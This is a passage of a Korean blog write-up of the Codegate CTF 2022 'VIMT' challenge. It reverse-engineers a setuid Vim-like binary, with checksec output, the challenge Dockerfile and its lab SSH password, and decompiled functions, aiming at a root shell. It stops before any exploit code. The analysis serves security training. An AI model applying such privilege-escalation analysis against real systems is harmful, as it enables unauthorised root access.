@@ -1,0 +1,425 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: light)">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: dark)"><meta name="generator" content="Hexo 6.2.0">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.1.1/css/all.min.css" integrity="sha256-DfWjNxDkM94fVBWx1H5BMMp0Zq7luBlV8QRcSES7s+0=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"juhyun167.github.io","root":"/","images":"/images","scheme":"Muse","darkmode":true,"version":"8.12.1","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":{"enable":false,"style":null},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":false,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"},"path":"/search.xml","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js"></script>
+
+    <meta name="description" content="개요  Monkeys help you  chall.zip 문제 분석 64비트 x86_64 바이너리 app 과 Dockerfile 등이 주어집니다. 바이너리는 심볼이 있고, NX 보호 기법이 적용되어 있습니다. 1234567$ checksec app[*] &amp;#x27;&#x2F;home&#x2F;user&#x2F;study&#x2F;ctf&#x2F;codegate22&#x2F;vimt&#x2F;app&amp;#x27;    Ar">
+<meta property="og:type" content="article">
+<meta property="og:title" content="[Codegate CTF 2022] VIMT">
+<meta property="og:url" content="https://juhyun167.github.io/2022/07/05/codegate22-vimt/index.html">
+<meta property="og:site_name" content="JUHYUN167">
+<meta property="og:description" content="개요  Monkeys help you  chall.zip 문제 분석 64비트 x86_64 바이너리 app 과 Dockerfile 등이 주어집니다. 바이너리는 심볼이 있고, NX 보호 기법이 적용되어 있습니다. 1234567$ checksec app[*] &amp;#x27;&#x2F;home&#x2F;user&#x2F;study&#x2F;ctf&#x2F;codegate22&#x2F;vimt&#x2F;app&amp;#x27;    Ar">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://juhyun167.github.io/images/codegate22-vimt/1.png">
+<meta property="og:image" content="https://juhyun167.github.io/images/codegate22-vimt/2.png">
+<meta property="og:image" content="https://juhyun167.github.io/images/codegate22-vimt/3.png">
+<meta property="og:image" content="https://juhyun167.github.io/images/codegate22-vimt/4.png">
+<meta property="og:image" content="https://juhyun167.github.io/images/codegate22-vimt/5.png">
+<meta property="og:image" content="https://juhyun167.github.io/images/codegate22-vimt/6.png">
+<meta property="og:image" content="https://juhyun167.github.io/images/codegate22-vimt/7.png">
+<meta property="og:image" content="https://juhyun167.github.io/images/codegate22-vimt/8.png">
+<meta property="og:image" content="https://juhyun167.github.io/images/codegate22-vimt/9.png">
+<meta property="article:published_time" content="2022-07-05T22:33:02.000Z">
+<meta property="article:modified_time" content="2022-07-06T13:50:43.262Z">
+<meta property="article:author" content="juhyun167 블로그">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://juhyun167.github.io/images/codegate22-vimt/1.png">
+
+
+<link rel="canonical" href="https://juhyun167.github.io/2022/07/05/codegate22-vimt/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"en","comments":true,"permalink":"https://juhyun167.github.io/2022/07/05/codegate22-vimt/","path":"2022/07/05/codegate22-vimt/","title":"[Codegate CTF 2022] VIMT"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>[Codegate CTF 2022] VIMT | JUHYUN167</title>
+  
+    <script async src="https://www.googletagmanager.com/gtag/js?id=G-2NL1HJ159T"></script>
+  <script class="next-config" data-name="google_analytics" type="application/json">{"tracking_id":"G-2NL1HJ159T","only_pageview":false}</script>
+  <script src="/js/third-party/analytics/google-analytics.js"></script>
+
+
+
+
+<!-- custom fonts -->
+<link rel="stylesheet" as="style" crossorigin href="https://cdn.jsdelivr.net/gh/orioncactus/pretendard/dist/web/static/pretendard-dynamic-subset.css" />
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Roboto+Mono:wght@400;700&display=swap" rel="stylesheet">
+
+<!-- google search console -->
+<meta name="google-site-verification" content="pV2zNbKpqSdeajzc7IIefYq62vg-J9PCZfCvLKwnYF8" />
+<!-- naver search advisor -->
+<meta name="naver-site-verification" content="e4b3b4646981d90b2cfdab4014543ed9338b4e57" />
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+<link rel="alternate" href="/rss2.xml" title="JUHYUN167" type="application/rss+xml">
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="headband"></div>
+
+  <main class="main">
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar" role="button">
+    </div>
+  </div>
+
+  <div class="site-meta">
+      <img class="custom-logo-image" src="/images/custom-logo.png" alt="JUHYUN167">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">JUHYUN167</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">Elegant and powerful theme for Hexo</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu">
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>Search
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup"><div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off" maxlength="80"
+           placeholder="Searching..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close" role="button">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div class="search-result-container no-result">
+  <div class="search-result-icon">
+    <i class="fa fa-spinner fa-pulse fa-5x"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+<!-- load header custom script -->
+<script src="/scripts/header.js"></script>
+
+</div>
+        
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-overview-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author site-overview-item animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">juhyun167 블로그</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap site-overview-item animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">6</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+        <span class="site-state-item-count">6</span>
+        <span class="site-state-item-name">categories</span>
+      </div>
+  </nav>
+</div>
+
+
+<ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/Computer-Science/">Computer Science</a><span class="category-list-count">1</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/Computer-Science/Data-Structures/">Data Structures</a><span class="category-list-count">1</span></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/Security/">Security</a><span class="category-list-count">3</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/Security/ARM-Exploitation/">ARM Exploitation</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/Security/CTF/">CTF</a><span class="category-list-count">2</span></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/Thoughts/">Thoughts</a><span class="category-list-count">2</span></li></ul>
+
+<!-- load sidebar custom script -->
+<script src="/scripts/sidebar.js"></script>
+
+        </div>
+      </div>
+    </div>
+  </aside>
+  <div class="sidebar-dimmer"></div>
+
+
+    </header>
+
+    
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="en">
+    <link itemprop="mainEntityOfPage" href="https://juhyun167.github.io/2022/07/05/codegate22-vimt/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="juhyun167 블로그">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="JUHYUN167">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="[Codegate CTF 2022] VIMT | JUHYUN167">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          [Codegate CTF 2022] VIMT
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+
+      <time title="Created: 2022-07-05 22:33:02" itemprop="dateCreated datePublished" datetime="2022-07-05T22:33:02+00:00">2022-07-05</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">Edited on</span>
+      <time title="Modified: 2022-07-06 13:50:43" itemprop="dateModified" datetime="2022-07-06T13:50:43+00:00">2022-07-06</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">In</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/Security/" itemprop="url" rel="index"><span itemprop="name">Security</span></a>
+        </span>
+          , 
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/Security/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+        <h2 id="%EA%B0%9C%EC%9A%94" tabindex="-1">개요</h2>
+<blockquote>
+<p>Monkeys help you</p>
+</blockquote>
+<p><a href="/uploads/codegate22-vimt/chall.zip">chall.zip</a></p>
+<h2 id="%EB%AC%B8%EC%A0%9C-%EB%B6%84%EC%84%9D" tabindex="-1">문제 분석</h2>
+<p>64비트 x86_64 바이너리 <code>app</code> 과 <code>Dockerfile</code> 등이 주어집니다. 바이너리는 심볼이 있고, NX 보호 기법이 적용되어 있습니다.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ checksec app</span><br><span class="line">[*] <span class="string">&#x27;/home/user/study/ctf/codegate22/vimt/app&#x27;</span></span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>
+<p><code>Dockerfile</code> 을 살펴보면 서버에서 바이너리에 setuid 권한을 부여하고 있으며, SSH 접속 가능한 계정과 비밀번호를 제공합니다. 따라서 주어진 바이너리를 통하여 root 권한의 셸을 획득하는 것이 목표임을 추측할 수 있습니다.</p>
+<figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ...</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">echo</span> <span class="string">&quot;/home/ctf/app&quot;</span> &gt; /home/ctf/.bash_profile</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">echo</span> <span class="string">&quot;exit&quot;</span> &gt;&gt; /home/ctf/.bash_profile</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">chown</span> root:root /home/ctf/app</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">chown</span> root:root /home/ctf/tmp</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">chmod</span> 640 /home/ctf/app</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">chmod</span> +x /home/ctf/app</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">chmod</span> u+s /home/ctf/app</span></span><br><span class="line"><span class="comment"># ...</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">echo</span> <span class="string">&#x27;ctf:ctf1234_smiley&#x27;</span> | chpasswd</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> chsh -s /bin/bash ctf</span></span><br></pre></td></tr></table></figure>
+<p>바이너리를 실행하면 문제의 이름처럼 Vim 에디터와 유사한 화면을 출력하는데, “hello world” 문자열을 입력했더니 각 문자 뒤에 쓰레기 값을 덧붙입니다.</p>
+<p><img src="/images/codegate22-vimt/1.png" alt="1.png"></p>
+<p><code>main</code> 함수에서 핵심적인 부분만 살펴보면 다음과 같습니다. 7행에서 <code>init</code> 함수를 호출하여 각종 전역 변수를 설정합니다. 15행에서 <code>getch</code> 함수로 문자를 입력받아 switch-case 구문에 넘깁니다. 문자가 Backspace인 경우 <code>deleteKey</code> 함수를 호출하고, 일반 문자의 경우 <code>inputKey</code> 함수를 호출하여 처리합니다. 문자가 Esc인 경우 Vim의 명령 모드(command mode)와 같이 <code>cmd</code> 에 추가적으로 커맨드를 입력받고, 52행부터 해당하는 커맨드의 함수를 호출합니다.</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl __noreturn <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">  cmd = (<span class="type">char</span> *)<span class="built_in">calloc</span>(<span class="number">1uLL</span>, <span class="number">256uLL</span>);</span><br><span class="line">  v4 = <span class="number">0</span>;</span><br><span class="line">  v3 = <span class="number">0</span>;</span><br><span class="line">  init();</span><br><span class="line">  setuid(<span class="number">0</span>);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">              <span class="keyword">while</span> ( !v3 )</span><br><span class="line">              &#123;</span><br><span class="line">                draw();</span><br><span class="line">                c = getch();</span><br><span class="line">                <span class="keyword">switch</span> ( c )</span><br><span class="line">                &#123;</span><br><span class="line">                  <span class="keyword">case</span> <span class="number">0x1B</span>:                    <span class="comment">// Esc</span></span><br><span class="line">                                                <span class="comment">// switch to command mode</span></span><br><span class="line">                    v3 = <span class="number">1</span>;</span><br><span class="line">                    <span class="built_in">printf</span>(<span class="string">&quot;\n:&quot;</span>);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                  <span class="keyword">case</span> <span class="number">0x7F</span>:                    <span class="comment">// Backspace</span></span><br><span class="line">                    <span class="keyword">if</span> ( deleteKey() == <span class="number">-1</span> )</span><br><span class="line">                      v3 = <span class="number">2</span>;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                  <span class="keyword">case</span> <span class="number">0xA</span>:</span><br><span class="line">                    <span class="keyword">if</span> ( cur_y &lt; y )</span><br><span class="line">                    &#123;</span><br><span class="line">                      ++cur_y;</span><br><span class="line">                      cur_x = <span class="number">0</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                  <span class="keyword">default</span>:</span><br><span class="line">                    <span class="keyword">if</span> ( inputKey(c) == <span class="number">-1</span> )</span><br><span class="line">                      v3 = <span class="number">2</span>;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">              &#125;</span><br><span class="line">              <span class="comment">// ...</span></span><br><span class="line">              _c = getch();</span><br><span class="line">              <span class="keyword">if</span> ( _c == <span class="string">&#x27;\n&#x27;</span> )</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">              <span class="keyword">if</span> ( v4 &lt; <span class="number">255</span> )</span><br><span class="line">              &#123;</span><br><span class="line">                v0 = v4++;</span><br><span class="line">                cmd[v0] = _c;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, _c);</span><br><span class="line">              &#125;</span><br><span class="line">            &#125;</span><br><span class="line">      <span class="comment">// ...</span></span><br><span class="line">      <span class="keyword">if</span> ( !<span class="built_in">strncmp</span>(<span class="string">&quot;set&quot;</span>, cmd, <span class="number">3uLL</span>) )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="comment">// ...</span></span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span> ( !<span class="built_in">strncmp</span>(<span class="string">&quot;compile&quot;</span>, cmd, <span class="number">7uLL</span>) )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( compile() != <span class="number">-1</span> )</span><br><span class="line">          <span class="built_in">memset</span>(cmd, <span class="number">0</span>, <span class="number">0x100</span>uLL);</span><br><span class="line">        v3 = <span class="number">2</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    <span class="keyword">if</span> ( setAxis(cmd) != <span class="number">-1</span> )</span><br><span class="line">      <span class="keyword">goto</span> LABEL_45;</span><br><span class="line">    v3 = <span class="number">2</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><code>init</code> 함수는 6행에서 ioctl 시스템 콜을 호출하고, 결과를 전역 변수 <code>x</code> 와 <code>y</code> 에 대입합니다. <code>/usr/include/asm-generic/ioctls.h</code> 파일을 참고하면 요청 번호 <code>0x5413</code> 은 <code>TIOCGWINSZ</code> 로, 현재 터미널의 가로와 세로 크기를 구하는 요청입니다. 10행에서 터미널의 크기를 바탕으로 문자를 입력받을 2차원 배열 <code>map</code> 을 할당합니다. 16행에서는 각종 값으로 생성한 난수를 이용해 <code>rand</code> 함수의 seed를 초기화하고 있습니다.</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __fastcall <span class="title function_">init</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  ioctl(<span class="number">1</span>, <span class="number">0x5413</span>uLL, &amp;sz);                     <span class="comment">// ioctl(1, TIOCGWINSZ, &amp;sz)</span></span><br><span class="line">  x = sz.ws_col;</span><br><span class="line">  y = sz.ws_row - <span class="number">2</span>;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">  <span class="built_in">map</span> = (<span class="type">char</span> **)<span class="built_in">calloc</span>(<span class="number">1uLL</span>, <span class="number">8LL</span> * (y + <span class="number">1</span>));</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; y; ++i )</span><br><span class="line">    <span class="built_in">map</span>[i] = (<span class="type">char</span> *)<span class="built_in">calloc</span>(<span class="number">1uLL</span>, x + <span class="number">1</span>);</span><br><span class="line">  v3 = clock();</span><br><span class="line">  v2 = time(<span class="number">0LL</span>);</span><br><span class="line">  v0 = getpid();</span><br><span class="line">  seed = mix(v3, v2, v0);</span><br><span class="line">  srand(seed);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><code>inputKey</code> 함수는 일반적인 문자 입력을 처리하는 함수입니다. <code>cur_x</code> , <code>cur_y</code> 는 현재 커서가 위치한 좌표를 나타내는 전역 변수로, 10행은 커서가 터미널의 가로 길이 끝까지 간 경우 줄바꿈하는 코드입니다. 19행에서 입력받은 문자를 2차원 배열 <code>map</code> 상에서 커서의 위치에 대입합니다. 20행의 반복문을 보면 문자 뒤로 랜덤한 5개의 문자를 추가하고 있는데, 이 부분의 코드가 원하는 문자열을 그대로 입력할 수 없었던 원인입니다.</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">inputKey</span><span class="params">(<span class="type">char</span> c)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> *row; <span class="comment">// rcx</span></span><br><span class="line">  <span class="type">int</span> xpos; <span class="comment">// esi</span></span><br><span class="line">  <span class="type">char</span> random_byte; <span class="comment">// di</span></span><br><span class="line">  <span class="type">char</span> *_row; <span class="comment">// rsi</span></span><br><span class="line">  <span class="type">int</span> _xpos; <span class="comment">// ecx</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( cur_x &gt;= x )</span><br><span class="line">  &#123;</span><br><span class="line">    cur_x = <span class="number">0</span>;</span><br><span class="line">    ++cur_y;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( cur_y &gt;= y )</span><br><span class="line">    cur_y = y - <span class="number">1</span>;</span><br><span class="line">  row = <span class="built_in">map</span>[cur_y];</span><br><span class="line">  xpos = cur_x++;</span><br><span class="line">  row[xpos] = c;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="number">5</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( cur_x &gt;= x )</span><br><span class="line">    &#123;</span><br><span class="line">      cur_x = <span class="number">0</span>;</span><br><span class="line">      ++cur_y;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( cur_y &gt;= y )</span><br><span class="line">      cur_y = y - <span class="number">1</span>;</span><br><span class="line">    random_byte = ascii[rand() % <span class="number">86</span>];</span><br><span class="line">    _row = <span class="built_in">map</span>[cur_y];</span><br><span class="line">    _xpos = cur_x++;</span><br><span class="line">    _row[_xpos] = random_byte;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><code>deleteKey</code> 함수는 Backspace 입력을 처리하는 함수입니다. Backspace를 한 번 입력할 때마다 반복문을 통해 현재 커서 위치에서 6개의 문자를 지웁니다.</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">deleteKey</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> *row; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+0h] [rbp-Ch]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">5</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( cur_x &lt; <span class="number">0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      cur_x = <span class="number">0</span>;</span><br><span class="line">      --cur_y;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( cur_y &lt; <span class="number">0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      cur_y = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    row = <span class="built_in">map</span>[cur_y];</span><br><span class="line">    row[--cur_x] = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><code>setAxis</code> 함수는 Esc 입력 후 “set y &lt;N&gt;” 커맨드를 처리하는 함수입니다. 21행에서 <code>cur_y</code> 전역 변수에 커맨드 매개변수로 전달된 정수 N을 대입합니다. 예를 들어 Esc 입력 후 &quot;set y 0&quot;을 입력하면, 커서의 세로축 위치가 첫 번째 줄로 이동합니다.</p>
